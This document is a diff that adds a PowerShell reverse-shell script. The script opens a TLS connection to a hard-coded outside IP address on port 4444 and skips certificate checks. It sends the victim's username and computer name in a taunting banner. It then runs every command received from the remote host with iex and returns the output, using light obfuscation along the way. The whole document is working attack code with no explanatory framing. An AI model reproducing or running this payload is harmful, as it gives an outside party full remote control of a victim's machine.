@@ -1,0 +1,16 @@
+$pm1=[Text.Encoding]::UTF8.GetBytes("[!] Quack you $env:USERNAME/$env:COMPUTERNAME! `n[?] And the horse you rode in on!`n`n")
+$localip=[Net.DNS]::GetHostEntry([Net.DNS]::GetHostName()).AddressList | Where-Object { $_.AddressFamily -eq 'InterNetwork' }
+$remoteip=[Net.IPAddress]::Parse("178.62.205.100")
+$ipLocal=New-Object Net.IPEndPoint($localip, 42069)
+$ipRemote=New-Object Net.IPEndPoint($remoteip, 4444)
+$pm2=New-Object Net.Sockets.TcpClient($ipLocal)
+$pm2.Connect($ipRemote)
+$s=$pm2.GetStream()
+$sSL=New-Object System.Net.Security.SslStream($s,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+$sSL.AuthenticateAsClient('madeby.0iphor13', $null, "Tls12", $false)
+$pm3=new-object System.IO.StreamWriter($sSL)
+$sSL.write($pm1,0,$pm1.Length)
+$pm3.Write('Zucky@PS '+(&('g'+'l'))+'> ')
+$pm3.flush()
+[byte[]]$pm4= 0..65535|%{0};while(($i=$sSL.Read($pm4, 0, $pm4.Length)) -ne 0){$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($pm4,0, $i);$Y=(iex $D | Out-String ) 2>&1;$X=$Y + 'Zucky@PS ' + (Get-LoCatIon).Path + '> ';$Z=([text.encoding]::UTF8).GetBytes($X);$sSL.Write($Z,0,$Z.Length);$sSL.Flush()}
+exit
